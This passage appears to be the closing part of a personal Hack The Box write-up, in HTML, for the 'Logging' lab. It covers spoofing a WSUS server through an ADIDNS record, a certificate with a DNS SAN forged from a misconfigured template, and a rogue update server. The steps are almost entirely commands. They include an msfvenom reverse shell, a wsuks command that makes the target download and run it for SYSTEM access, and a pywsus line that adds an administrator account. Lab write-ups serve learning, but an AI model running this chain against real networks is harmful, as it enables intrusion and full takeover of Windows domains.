+<p>Looking at the new bloodhound scans we have access to a certificate template, that would probably let us
+impersonate the aforementioned WSUS server TLS wise. But we also need to gain some kind of man in the middle
+position, probably by creating a DNS record to point the WSUS address to our own machine</p>
+<section id="leverage-adidns-to-impersonate-the-wsus-server">
+<h3>Leverage ADIDNS to Impersonate the WSUS Server<a class="headerlink" href="#leverage-adidns-to-impersonate-the-wsus-server" title="Permalink to this heading">#</a></h3>
+<p>This fails</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Add-DnsServerResourceRecordA</span> <span class="n">-Name</span> <span class="s2">&quot;wsus.logging.htb&quot;</span> <span class="n">-ZoneName</span> <span class="s2">&quot;logging.htb&quot;</span> <span class="n">-IPv4Address</span> <span class="s2">&quot;10.10.16.84&quot;</span>
+</pre></div>
+</div>
+<p>Also fails</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-ADComputer</span> <span class="n">-Name</span> <span class="s2">&quot;wsus&quot;</span> <span class="n">-SamAccountName</span> <span class="s2">&quot;wsus&quot;</span> <span class="n">-Enabled</span> <span class="nv">$true</span>
+</pre></div>
+</div>
+<p>Also fails</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Add-DnsServerResourceRecordA</span> <span class="n">-Name</span> <span class="s2">&quot;wsus&quot;</span> <span class="n">-ZoneName</span> <span class="s2">&quot;logging.htb&quot;</span> <span class="n">-IPv4Address</span> <span class="s2">&quot;10.10.16.84&quot;</span>
+</pre></div>
+</div>
+<p>Reading about the fact that apparently by default in AD users can create up to 10 machine accounts,
+and those machine accounts can have DNS records.</p>
+<p>Looks like PowerMad can do that. I couldn’t get it to work though.</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">84</span><span class="p">:</span><span class="n">9090</span><span class="p">/</span><span class="n">Powermad</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-OutFile</span> <span class="n">Powermad</span><span class="p">.</span><span class="n">ps1</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">.</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="s2">&quot;wsus&quot;</span> <span class="n">-Password</span> <span class="s2">&quot;Password123!&quot;</span> <span class="n">-Verbose</span> <span class="p">-</span><span class="n">-Domain</span> <span class="n">logging</span><span class="p">.</span><span class="n">htb</span> <span class="n">-DomainController</span> <span class="n">DC01</span><span class="p">.</span><span class="n">logging</span><span class="p">.</span><span class="n">htb</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="s2">&quot;wsus&quot;</span> <span class="n">-Password</span> <span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;Password123!&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span> <span class="n">-Domain</span> <span class="s2">&quot;logging.htb&quot;</span> <span class="n">-DomainController</span> <span class="s2">&quot;DC01.logging.htb&quot;</span> <span class="n">-Verbose</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$securePass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;Password123!&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+<span class="nb">New-ADComputer</span> <span class="n">-Name</span> <span class="s2">&quot;wsus&quot;</span> <span class="n">-SamAccountName</span> <span class="s2">&quot;wsus&quot;</span> <span class="n">-AccountPassword</span> <span class="nv">$securePass</span> <span class="n">-Enabled</span> <span class="nv">$true</span> <span class="n">-Path</span> <span class="s2">&quot;CN=Computers,DC=logging,DC=htb&quot;</span> <span class="n">-Verbose</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="s2">&quot;wsus&quot;</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;p@ssword!&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span> <span class="n">-Verbose</span>
+</pre></div>
+</div>
+<p>Trying SharpMad</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">.\</span><span class="n">SharpMad</span><span class="p">.</span><span class="n">exe</span> <span class="n">add</span> <span class="p">/</span><span class="n">machine</span><span class="p">:</span><span class="n">wsus</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">Password123</span><span class="p">!</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">logging</span><span class="p">.</span><span class="n">htb</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">84</span><span class="p">:</span><span class="n">9090</span><span class="p">/</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">-OutFile</span> <span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span>
+<span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">84</span><span class="p">:</span><span class="n">9090</span><span class="p">/</span><span class="n">Sharpmad</span><span class="p">.</span><span class="n">exe</span> <span class="n">-OutFile</span> <span class="n">Sharpmad</span><span class="p">.</span><span class="n">exe</span>
+</pre></div>
+</div>
+<p>That works by creating the record directly with ADIDNS!</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">.\</span><span class="n">Sharpmad</span><span class="p">.</span><span class="n">exe</span> <span class="n">ADIDNS</span> <span class="n">-Action</span> <span class="n">new</span> <span class="n">-Node</span> <span class="n">wsus</span> <span class="n">-Data</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">84</span>
+</pre></div>
+</div>
+<p>It took a minute to propagate, but eventually our address is in the DNS</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Resolve-DnsName</span> <span class="n">wsus</span><span class="p">.</span><span class="n">logging</span><span class="p">.</span><span class="n">htb</span>
+</pre></div>
+</div>
+</section>
+<section id="obtain-a-tls-identity-for-the-server">
+<h3>Obtain a TLS identity for the server<a class="headerlink" href="#obtain-a-tls-identity-for-the-server" title="Permalink to this heading">#</a></h3>
+<p>Get Certify on the box</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">84</span><span class="p">:</span><span class="n">9090</span><span class="p">/</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">-OutFile</span> <span class="n">Certify</span><span class="p">.</span><span class="n">exe</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">.\</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">find</span>
+</pre></div>
+</div>
+<p>Certify v1 works but only support adding SANs as UPN, we want a DNS record SAN</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">.\</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">DC01</span><span class="p">.</span><span class="n">logging</span><span class="p">.</span><span class="n">htb</span><span class="p">\</span><span class="n">logging-DC01-CA</span> <span class="p">/</span><span class="n">template</span><span class="p">:</span><span class="n">UpdateSrv</span>
+<span class="p">.\</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">DC01</span><span class="p">.</span><span class="n">logging</span><span class="p">.</span><span class="n">htb</span><span class="p">\</span><span class="n">logging-DC01-CA</span> <span class="p">/</span><span class="n">template</span><span class="p">:</span><span class="n">UpdateSrv</span> <span class="p">/</span><span class="n">altname</span><span class="p">:</span><span class="n">wsus</span><span class="p">.</span><span class="n">logging</span><span class="p">.</span><span class="n">htb</span>
+</pre></div>
+</div>
+<p>Apparently that’s possible with Certify v2, which I can’t find a pre-compiled binary for.
+And I really don’t have any Windows machine to compile this stuff on. So here comes a fun side-quest of spinning
+up a Windows machine in Azure, installing Visual Studio Code, and git and so on just to compile
+this thing. Yes Password 123 on the internet, I don’t care, I’ll destroy it in 30 min</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">xfreerdp3</span> <span class="p">/</span><span class="n">v</span><span class="p">:</span><span class="n">51</span><span class="p">.</span><span class="n">104</span><span class="p">.</span><span class="n">57</span><span class="p">.</span><span class="n">102</span> <span class="p">/</span><span class="n">u</span><span class="p">:</span><span class="n">blnkn</span> <span class="p">/</span><span class="n">p</span><span class="p">:</span><span class="s1">&#39;Password123!&#39;</span> <span class="p">/</span><span class="n">size</span><span class="p">:</span><span class="n">100</span><span class="p">%</span> <span class="p">/</span><span class="n">smart-sizing</span> <span class="p">/</span><span class="n">dynamic-resolution</span> <span class="p">+</span><span class="n">clipboard</span>
+</pre></div>
+</div>
+<p>Then send myself the binary somehow</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$ify</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Release</span><span class="p">\</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span><span class="s2">&quot;</span>
+<span class="s2">$fileBytes = [System.IO.File]::ReadAllBytes($filePath)</span>
+<span class="s2">$base64Data = [Convert]::ToBase64String($fileBytes)</span>
+<span class="s2">$bodyPayload = @{</span>
+<span class="s2">    filename = &quot;</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span><span class="s2">&quot;</span>
+<span class="s2">    filedata = $base64Data</span>
+<span class="s2">} | ConvertTo-Json</span>
+
+<span class="s2">Invoke-RestMethod -Uri &quot;</span><span class="n">134</span><span class="p">.</span><span class="n">209</span><span class="p">.</span><span class="n">183</span><span class="p">.</span><span class="n">194</span><span class="p">:</span><span class="n">9090</span><span class="s2">&quot; `</span>
+<span class="s2">                  -Method Post `</span>
+<span class="s2">                  -Body $bodyPayload `</span>
+<span class="s2">                  -ContentType &quot;</span><span class="n">application</span><span class="p">/</span><span class="n">json</span><span class="s2">&quot;</span>
+</pre></div>
+</div>
+<p>Make sure the hash matches after decoding</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Get-FileHash</span> <span class="p">.\</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Algorithm</span> <span class="n">MD5</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-O<span class="w"> </span>http://134.209.183.194:9090/Certify2.exe
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>md5sum<span class="w"> </span>Certify2.exe
+</pre></div>
+</div>
+<p>Get it on the actual box</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>iwr<span class="w"> </span>-uri<span class="w"> </span>http://10.10.16.84:9090/Certify2.exe<span class="w"> </span>-OutFile<span class="w"> </span>Certify2.exe
+</pre></div>
+</div>
+<p>And boom, now we can generate the x509 identity correctly</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="p">.\</span><span class="n">Certify2</span><span class="p">.</span><span class="n">exe</span> <span class="n">request</span> <span class="p">-</span><span class="n">-ca</span> <span class="n">DC01</span><span class="p">.</span><span class="n">logging</span><span class="p">.</span><span class="n">htb</span><span class="p">\</span><span class="n">logging-DC01-CA</span> <span class="p">-</span><span class="n">-template</span> <span class="n">UpdateSrv</span> <span class="p">-</span><span class="n">-dns</span> <span class="n">wsus</span><span class="p">.</span><span class="n">logging</span><span class="p">.</span><span class="n">htb</span> <span class="p">-</span><span class="n">-output-pem</span>
+</pre></div>
+</div>
+<p>And it does have a proper DNS SAN</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>wl-paste<span class="w"> </span><span class="p">|</span><span class="w"> </span>openssl<span class="w"> </span>x509<span class="w"> </span>-noout<span class="w"> </span>-ext<span class="w"> </span>subjectAltName<span class="w"> </span>-subject<span class="w"> </span>-issuer
+X509v3<span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:
+<span class="w">    </span>DNS:wsus.logging.htb
+<span class="nv">subject</span><span class="o">=</span><span class="nv">DC</span><span class="o">=</span>htb,<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>logging,<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Users,<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>jaylee.clifton
+<span class="nv">issuer</span><span class="o">=</span><span class="nv">DC</span><span class="o">=</span>htb,<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>logging,<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>logging-DC01-CA
+</pre></div>
+</div>
+</section>
+<section id="build-a-rogue-wsus-server">
+<h3>Build a rogue WSUS server<a class="headerlink" href="#build-a-rogue-wsus-server" title="Permalink to this heading">#</a></h3>
+<p>Pywsus doesn’t seem to have TLS support, but wsuks does</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python<span class="w"> </span>pywsus.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span><span class="m">10</span>.10.16.84<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--port<span class="w"> </span><span class="m">8530</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--executable<span class="w"> </span>/path/to/PsExec64.exe<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--command<span class="w"> </span><span class="s1">&#39;/accepteula /s cmd.exe /c &quot;net user testuser somepassword /add &amp;&amp; net localgroup Administrators testuser /add&quot;&#39;</span>
+</pre></div>
+</div>
+<p>Default tries to use a signed psexec and add a new admin user, but it doesn’t work</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>wsuks<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-I<span class="w"> </span>tun0<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">10</span>.129.53.182<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--WSUS-Server<span class="w"> </span>wsus.logging.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--tls-cert<span class="w"> </span>certKey.pem<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--serve-only
+</pre></div>
+</div>
+<p>Tried to just send myself a get, that works</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>wsuks<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-I<span class="w"> </span>tun0<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">10</span>.129.53.182<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--WSUS-Server<span class="w"> </span>wsus.logging.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--tls-cert<span class="w"> </span>certKey.pem<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--serve-only<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;/accepteula /s powershell.exe -NoProfile -ep Bypass -Command iwr -Uri 10.10.16.84:9090 -Method Get&quot;</span>
+</pre></div>
+</div>
+<p>Make an executable reverse shell</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>msfvenom<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.16.84<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4242</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-f<span class="w"> </span>exe<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-o<span class="w"> </span>shell.exe
+</pre></div>
+</div>
+<p>Download it and start it</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>wsuks<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-I<span class="w"> </span>tun0<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">10</span>.129.53.182<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--WSUS-Server<span class="w"> </span>wsus.logging.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--tls-cert<span class="w"> </span>certKey.pem<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--serve-only<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;/accepteula /s powershell.exe -NoProfile -ep Bypass -Command iwr -Uri 10.10.16.84:9090/shell.exe -OutFile C:\Windows\Tasks\shell.exe; Start-Process C:\Windows\Tasks\shell.exe&quot;</span>
+</pre></div>
+</div>
+<p>Voilà!</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">whoami</span>
+<span class="n">whoami</span>
+<span class="n">nt</span> <span class="n">authority</span><span class="p">\</span><span class="n">system</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>rusthound-ce<span class="w"> </span>-d<span class="w"> </span>logging.htb<span class="w"> </span>-u<span class="w"> </span>wallace.everette<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcom***&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>certipy.json<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span><span class="s1">&#39;.&quot;Certificate Templates&quot; | to_entries[] | select(all(.value.Permissions.&quot;Enrollment Permissions&quot;.&quot;Enrollment Rights&quot;[]; test(&quot;domain&quot;;&quot;i&quot;) or test(&quot;enterprise&quot;;&quot;i&quot;) or test(&quot;RAS&quot;;&quot;i&quot;)) | not)&#39;</span>
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../manager/manager.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Manager</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../jupiter/jupiter.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Jupiter</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Logging</a><ul>
+<li><a class="reference internal" href="#enum">Enum</a></li>
+<li><a class="reference internal" href="#smb-enumeration">SMB Enumeration</a></li>
+<li><a class="reference internal" href="#credential-exposure-in-log-files">Credential Exposure in Log files</a></li>
+<li><a class="reference internal" href="#ldap-enumeration">LDAP Enumeration</a></li>
+<li><a class="reference internal" href="#learning-about-dcom">Learning About DCOM</a></li>
+<li><a class="reference internal" href="#learning-about-potatoes">Learning About Potatoes</a></li>
+<li><a class="reference internal" href="#attacking-gmsa-group-managed-service-accounts">Attacking GMSA (Group Managed Service Accounts)</a></li>
+<li><a class="reference internal" href="#further-enumeration-as-msa-health">Further Enumeration as msa health</a></li>
+<li><a class="reference internal" href="#dll-hijacking">DLL Hijacking</a></li>
+<li><a class="reference internal" href="#further-enumeration-as-jaylee-clifton">Further Enumeration as jaylee clifton</a></li>
+<li><a class="reference internal" href="#spoofing-wsus-windows-server-update-services">Spoofing WSUS (Windows Server Update Services)</a><ul>
+<li><a class="reference internal" href="#leverage-adidns-to-impersonate-the-wsus-server">Leverage ADIDNS to Impersonate the WSUS Server</a></li>
+<li><a class="reference internal" href="#obtain-a-tls-identity-for-the-server">Obtain a TLS identity for the server</a></li>
+<li><a class="reference internal" href="#build-a-rogue-wsus-server">Build a rogue WSUS server</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
